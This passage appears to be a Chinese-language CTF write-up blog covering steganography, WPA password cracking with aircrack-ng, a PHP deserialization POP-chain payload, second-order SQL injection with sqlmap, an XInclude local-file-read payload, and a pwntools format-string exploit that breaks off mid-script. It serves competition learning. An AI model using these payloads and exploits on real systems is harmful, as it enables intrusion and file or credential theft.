<p>又是一个魔改的文件头(正常zip文件头 504B0304 ),手动分离得到zip</p>
<p>emmmm需要密码</p>
<p>用stegsolve发现分离出来的png里藏着二维码</p>
<p>猜测做了蒙版处理</p>
<p>打开ps一段猛如虎()(自闭)的操作后,手动拼接出了二维码</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8t8zumovfj309o0aa0t2.jpg" alt="image.png"></p>
<p>得到压缩包密码1tsEz_b14ndVV4t3rM4k</p>
<p>解压得到两张图片</p>
<p>用beyondcompare得到flag</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8t93pbylej30em0jjgqg.jpg" alt="image.png"></p>
<p>flag{3399dcb7-9e15-422f-9bf9-9db30dab70ae}</p>
<h3 id="wireless"><a href="#wireless" class="headerlink" title="wireless"></a>wireless</h3><p>下载得到readme和一个流量</p>
<p>readme</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">已知密码格式是6666xxxx</span><br></pre></td></tr></table></figure>

<p>原本试着生成一个所有可打印字符的密码,但是这个也要500m+</p>
<p>所以先用纯数字密码试试</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">f=<span class="built_in">open</span>(<span class="string">&quot;dict.txt&quot;</span>,<span class="string">&quot;w&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>**<span class="number">4</span>):</span><br><span class="line">    f.write(<span class="string">&quot;6666%04d\n&quot;</span>%i)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>

<p>用kali的<code>aircrack-ng</code> 来破解通信内容</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8t9ym6aq4j30ka0djwoh.jpg" alt="image.png"></p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8t9zwgppwj30kf0e3aj3.jpg" alt="image.png"></p>
<p>flag{0566668912-f059-448f}</p>
<p>幸亏没有直接爆所有可打印字符</p>
<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">1</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$text</span> = base64_encode(file_get_contents(<span class="variable">$value</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$text</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="keyword">$this</span>-&gt;file_get(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;source.<span class="string">&#x27;瑙ｆ瀽寮€濮�&#x27;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">$this</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/http|https|file:|gopher|dict|\.\.|fllllllaaaaaag/i&#x27;</span>,<span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            highlight_file(<span class="keyword">$this</span>-&gt;source);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">&quot;step1&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/http|https|file:|gopher|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker~&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;params = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$func</span> = <span class="keyword">$this</span>-&gt;params;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$func</span>();</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;chal&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$chal</span> = unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;chal&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$show</span> = <span class="keyword">new</span> Show(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    <span class="variable">$show</span>-&gt;_show();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>%100反序列化链构造</p>
<ol>
<li><p><code>Show::__wake</code>是唯一可以入手的地方</p>
</li>
<li><p>在这个方法中只有$this-&gt;source可以构造pop链的连接点</p>
</li>
</ol>
<p>阅读代码发现<code>Show::__toString</code>会被<code> if(preg_match(&quot;/http|https|file:|gopher|dict|\.\./i&quot;, $this-&gt;source))</code>调用</p>
<ol start="3">
<li><code>Show::__toString</code>:  $this-&gt;str[‘str’]-&gt;source和<code>Test::__get</code>构成链接点</li>
<li><code>Test::__get</code>: <code>$func = $this-&gt;params;return $func();</code>和<code>Read::__invoke</code>构成链接点</li>
<li>而Read()可以任意读取文件</li>
</ol>
<p>payload生成:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&quot;&quot;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/http|https|file:|gopher|dict|\.\.|fllllllaaaaaag/i&#x27;</span>,<span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            highlight_file(<span class="keyword">$this</span>-&gt;source);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span>=<span class="string">&quot;fllllllaaaaaag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$text</span> = base64_encode(file_get_contents(<span class="variable">$value</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$text</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="keyword">$this</span>-&gt;file_get(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$source</span>=<span class="string">&quot;666&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$func</span> = <span class="keyword">$this</span>-&gt;params;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$func</span>();</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> Show();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> Show();</span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> Test;</span><br><span class="line"><span class="comment">//$s-&gt;str[&quot;str&quot;] = $t;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Read::__invoke</span></span><br><span class="line"><span class="variable">$c</span>-&gt;params=<span class="keyword">new</span> Read;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Test::__get</span></span><br><span class="line"><span class="variable">$b</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]=<span class="variable">$c</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Show::__tostring</span></span><br><span class="line"><span class="variable">$a</span>-&gt;source=<span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span>(urlencode(serialize(<span class="variable">$a</span>)));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>最后一步就剩flag的文件名,从正则中抠出<code>fllllllaaaaaag</code>但是直接读取,网页500,是文件不存在的结果</p>
<p>一番尝试后flag的文件名<code>fllllllaaaaaag.php</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag = &quot;flag&#123;df210681-fb10-4c0f-ba25-1f678eb38f85&#125;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>





<h3 id="babygame"><a href="#babygame" class="headerlink" title="babygame"></a>babygame</h3><p>文件树</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">index.html</span><br><span class="line">tools.php?hash=</span><br><span class="line">manage.php?showuer</span><br><span class="line">			register</span><br><span class="line">			login</span><br><span class="line">			msgid=1</span><br><span class="line">			</span><br></pre></td></tr></table></figure>



<p>index.html</p>
<p><code>&lt;!-- if you need hash tools, location: tools.php --&gt;</code></p>
<p>flag生成方式</p>
<p><code> flag&#123;md5(name . md5(pass))&#125;</code></p>
<p>网站存在两个cookie: __jsluid_h , PHPSESSID </p>
<p>约束攻击生效,但是无法拿到flag</p>
<p>二次注入测试逃逸引号</p>
<p>宽字节x=&gt;正常回显</p>
<p>%00x=&gt;\0</p>
<p>出现需要转义的地方没有假flag</p>
<p><code>a&#39;#</code>没有flag</p>
<p><code>a\&#39;#</code>出现flag,md5为<code>flag&#123;md5(&quot;a\\\&#39;&quot; . md5(pass))&#125;</code></p>
<p>而直接<code>b\&#39;#</code>是没有flag的,而且与#无关</p>
<p>判断用户时候存在再给一个flag链接</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a\\\&#x27;#=&gt;a\&#x27;#=&gt;select * from xx where user=&#x27;$user&#x27;?</span><br><span class="line"></span><br><span class="line">a\&#x27;=&gt;a&#x27;,用户不存在</span><br><span class="line"></span><br><span class="line">猜测</span><br></pre></td></tr></table></figure>

<p><code>c\&#39;#</code>=&gt;no flag</p>
<p><code>c&#39;#</code>=&gt;<code>c\&#39;#</code>出现flag(得删除cookie)</p>
<p>注入点就在这</p>
<p>什么代码导致这种结果</p>
<p>登陆时:<code>$_SESSION[x]=query(&quot;select * from xx where user=&#39;&quot;.mysql_real_escape($_POST[&#39;user&#39;]).&quot;&#39; and pass=&#39;&quot;.mysql_real_escape($_POST[&#39;pass&#39;])&quot;).&quot;&#39;&quot;</code></p>
<p><code>query(&quot;select * from xx where user=&#39;$_SESSION[x]&#39;&quot;)</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">user	php($_SESSION) mysql(&#x27;$sql&#x27;)</span><br><span class="line">a&#x27;		a&#x27; 			a&#x27;</span><br><span class="line">a\&#x27;		a\&#x27; 		a\&#x27;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>存在过滤?</p>
<p>依据个数生成flag链接</p>
<p>后面想到为啥注入点不可以是msgid呢</p>
<p>约束攻击获得一个只带有<code>\</code>的账号</p>
<p>注册一个a+’ ‘*28+’”‘ 的账号</p>
<p>msgid处出现注入点</p>
<p><code>or 1%23</code>成功</p>
<p>用sqlmap爆破得到admin的密码拿到tools.php解密得到:<code> ChunQiuGame</code></p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8ta75axdlj30bv036jrd.jpg" alt="image.png"></p>
<p>正常的xxe没啥用,找到一叶飘零的一篇文章</p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/156227">https://www.anquanke.com/post/id/156227</a></p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;root xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot;&gt;</span><br><span class="line"> &lt;xi:include href=&quot;file:///flag&quot; parse=&quot;text&quot;/&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>

<p>flag{5ea7d712-e461-4d29-9246-4ea6266775a8}</p>
<p>………………..气死了就差一点拿到flag</p>
<h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="easy-printf"><a href="#easy-printf" class="headerlink" title="easy_printf"></a>easy_printf</h3><p>pwnable.tw原题魔改，<code>bss</code>没有<code>stdin</code>,<code>stdout</code>,<code>stderr</code>了，但是一开始有个询问姓名，不知道有什么用,后来试了各种方法，想到了把<code>stdout</code>的<code>fileno</code>改为<code>2</code>，就可以绕过<code>close(1)</code>了<br>而且刚好</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> ► 0x40089f &lt;func1+57&gt;    mov    eax, 0</span><br><span class="line">   0x4008a4 &lt;func1+62&gt;    call   func2 &lt;0x4007fa&gt;</span><br><span class="line"> </span><br><span class="line">   0x4008a9 &lt;func1+67&gt;    mov    eax, 0</span><br><span class="line">   0x4008ae &lt;func1+72&gt;    mov    rcx, qword ptr [rbp - 8]</span><br><span class="line">   0x4008b2 &lt;func1+76&gt;    xor    rcx, qword ptr fs:[0x28]</span><br><span class="line">   0x4008bb &lt;func1+85&gt;    je     func1+92 &lt;0x4008c2&gt;</span><br><span class="line"> </span><br><span class="line">   0x4008bd &lt;func1+87&gt;    call   0x400648</span><br><span class="line"> </span><br><span class="line">   0x4008c2 &lt;func1+92&gt;    leave  </span><br><span class="line">   0x4008c3 &lt;func1+93&gt;    ret    </span><br><span class="line"> </span><br><span class="line">   0x4008c4 &lt;main&gt;        push   rbp</span><br><span class="line">   0x4008c5 &lt;main+1&gt;      mov    rbp, rsp</span><br><span class="line">───────────────────────────────────[ STACK ]────────────────────────────────────</span><br><span class="line">00:0000│ rsi rsp  0x7fffc9a192f0 ◂— 0x4141414141414141 (&#x27;AAAAAAAA&#x27;)</span><br><span class="line">01:0008│          0x7fffc9a192f8 —▸ 0x7fe173507690 (_IO_file_underflow+496) ◂— 0xe8df8948fffffeff</span><br><span class="line">02:0010│          0x7fffc9a19300 —▸ 0x7fe173852540 (_IO_2_1_stderr_) ◂— 0xfbad2087</span><br></pre></td></tr></table></figure>

<p>名字下面残留有<code>stderr</code>，所以读取名字时,<code>partial overwrite</code>改为<code>_IO_2_1_stdout_-&gt;_fileno</code>，然后把<code>_fileno</code>改为2即可，后面的和<code>pwnable.tw</code>没什么区别，有了泄露，也有了无限格式化字符串攻击，随便怎么玩</p>
<p>exp为:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fmtstr</span>(<span class="params">offset, addr, data, written</span>):</span></span><br><span class="line">	cnt = <span class="number">0</span></span><br><span class="line">	payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">	address = <span class="string">&#x27;&#x27;</span></span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> data:</span><br><span class="line">		cur = <span class="built_in">ord</span>(x)</span><br><span class="line">		<span class="keyword">if</span> cur &gt;= written&amp;<span class="number">0xff</span>:</span><br><span class="line">			to_add = cur - (written&amp;<span class="number">0xff</span>)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			to_add = <span class="number">0x100</span> + cur - (written&amp;<span class="number">0xff</span>)</span><br><span class="line">		<span class="built_in">round</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line">		<span class="keyword">if</span> to_add != <span class="number">0</span>:</span><br><span class="line">			<span class="built_in">round</span> += <span class="string">&quot;%&#123;&#125;c&quot;</span>.<span class="built_in">format</span>(to_add)</span><br><span class="line">		<span class="built_in">round</span> += <span class="string">&quot;%&#123;&#125;$hhn&quot;</span>.<span class="built_in">format</span>(offset+cnt+<span class="built_in">len</span>(data)*<span class="number">2</span>)</span><br><span class="line">		<span class="keyword">assert</span>(<span class="built_in">len</span>(<span class="built_in">round</span>) &lt;= <span class="number">0x10</span>)</span><br><span class="line">		written += to_add + <span class="number">0x10</span> - <span class="built_in">len</span>(<span class="built_in">round</span>)</span><br><span class="line">		payload += <span class="built_in">round</span>.ljust(<span class="number">0x10</span>, <span class="string">&#x27;_&#x27;</span>)</span><br><span class="line">		address += p64(addr+cnt)</span><br><span class="line">		cnt+=<span class="number">1</span></span><br><span class="line">	<span class="keyword">return</span> payload + address</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">host,port=<span class="number">12001</span></span>):</span></span><br><span class="line">	<span class="keyword">if</span> host:</span><br><span class="line">		p = remote(host,port)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="comment"># p = process(&quot;./easy_printf&quot;,env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc.so&quot;&#125;)</span></span><br><span class="line">		p = process(<span class="string">&quot;./easy_printf&quot;</span>)</span><br><span class="line">		gdb.attach(p,<span class="string">&quot;b *0x000000000400846&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;write down your name&quot;</span>)</span><br><span class="line">	<span class="comment"># t = raw_input(&#x27;guess: &#x27;)</span></span><br><span class="line">	t = <span class="number">0x7</span></span><br><span class="line">	stdout_fileno = (<span class="built_in">int</span>(t) &lt;&lt; <span class="number">12</span>) | <span class="number">0x690</span></span><br><span class="line">	p.send(<span class="string">&quot;A&quot;</span>*<span class="number">0x10</span>+p16(stdout_fileno))</span><br><span class="line">	pause()</span><br><span class="line">	</span><br><span class="line">	buf_addr = <span class="number">0x601060</span></span><br><span class="line">	payload =  <span class="string">&quot;%&#123;&#125;c%28$hhn%&#123;&#125;c%58$hn&quot;</span>.<span class="built_in">format</span>(<span class="number">2</span>,<span class="number">0x2a6</span>).ljust(<span class="number">0x18</span>,<span class="string">&#x27;_&#x27;</span>)</span><br><span class="line">	payload += fmtstr(<span class="number">9</span>,buf_addr,p64(<span class="number">0x000000000400814</span>)[:<span class="number">3</span>],<span class="number">0x2ab</span>)</span><br><span class="line">	p.send(payload)</span><br><span class="line">	pause()</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	payload =  <span class="string">&quot;%&#123;&#125;c%23$hhn%35$p-%36$p^%37$p-%38$p-%39$p*%40$p-&quot;</span>.<span class="built_in">format</span>(<span class="number">0x14</span>)</span><br><span class="line">	p.send(payload)</span><br><span class="line">	pause()</span><br><span class="line">	p.recvuntil(<span class="string">&quot;^&quot;</span>)</span><br><span class="line">	stack = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;-&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;*&quot;</span>)</span><br><span class="line">	libc.address = <span class="built_in">int</span>(p.recvuntil(<span 